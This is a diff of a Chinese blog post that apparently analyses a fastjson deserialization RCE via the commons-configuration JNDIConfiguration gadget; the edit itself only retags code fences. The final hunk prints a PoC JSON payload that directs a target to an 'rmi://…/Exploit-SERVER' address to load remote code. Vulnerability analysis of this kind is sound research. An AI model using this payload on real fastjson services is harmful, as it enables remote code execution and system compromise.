@@ -23,7 +23,7 @@ fastjson：  `version <= 1.2.61`，目前官方还没发布补丁，通杀所有
 
 造成漏洞的根因是fastjson反序列化JSON字符串时，会自动调用构造方法和get/setXXX方法，下面看一段fastjson反序列化JSON串的测试代码，先定义User类：  
 
-```Java
+```java
 package com.blacklist.test;
 
 public class User {
@@ -71,7 +71,7 @@ public class User {
 
 使用fastjson反序列化一段JSON字符串成User对象：  
 
-```Java
+```java
 package com.blacklist.test;
 
 import com.alibaba.fastjson.JSON;
@@ -106,7 +106,7 @@ getTest方法被自动调用！
 可以看见fastjson反序列化字符串时会依次自动调用对象的构造方法，setXXX方法，getXXX方法。注意，被反序列化的字符串中没有address和getTest方法的相关的要素，但是fastjson依然自动调用了get方法。如果这些get/setXXX方法里面存在JNDI Reference注入漏洞（*这部分知识详情可参考笔者发布的上一篇文章[《CVE-2019-14540远程代码执行漏洞分析&复现》](https://curz0n.github.io/2019/09/20/cve-2019-14540/)*），那就可以借助fastjson的特性执行我们指定的任意代码，造成RCE。  
 从公布的poc可知这次利用的gadget是[commons-configuration](https://github.com/apache/commons-configuration/blob/master/src/main/java/org/apache/commons/configuration2/JNDIConfiguration.java)组件的`org.apache.commons.configuration2.JNDIConfiguration.setPrefix(final String prefix)`方法，源码如下：  
 
-```Java
+```java
     public void setPrefix(final String prefix)
     {
         this.prefix = prefix;
@@ -118,7 +118,7 @@ getTest方法被自动调用！
 
 setPrefix方法就是初始化成员变量，并使baseContext等于null，逻辑很简单，看不出任何问题。那我们就先看一下JNDIConfiguration的构造方法，无参构造方法调用带1个参数的构造方法，然后new一个InitialContext对象，调用带有2个参数的构造方法，代码如下所示：  
 
-```Java
+```java
     public JNDIConfiguration(final String prefix) throws NamingException
     {
         this(new InitialContext(), prefix);
@@ -127,7 +127,7 @@ setPrefix方法就是初始化成员变量，并使baseContext等于null，逻�
 
 带两个参数的构造方法详情如下，把InitialContext对象赋值给成员变量context：  
 
-```Java
+```java
     public JNDIConfiguration(final Context context, final String prefix)
     {
         this.context = context; //new InitialContext()
@@ -139,7 +139,7 @@ setPrefix方法就是初始化成员变量，并使baseContext等于null，逻�
 
 接着分析代码，看哪里调用了context变量，最后定位到getBaseContext方法，代码详情如下：  
 
-```Java
+```java
     public Context getBaseContext() throws NamingException
     {
         if (baseContext == null)
@@ -189,7 +189,7 @@ Configuration2_Gadget
 
 根据前面的漏洞分析，构造基于rmi协议的poc如下：  
 
-```
+```java
 String poc = "{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit-SERVER\"}";
 ```
 
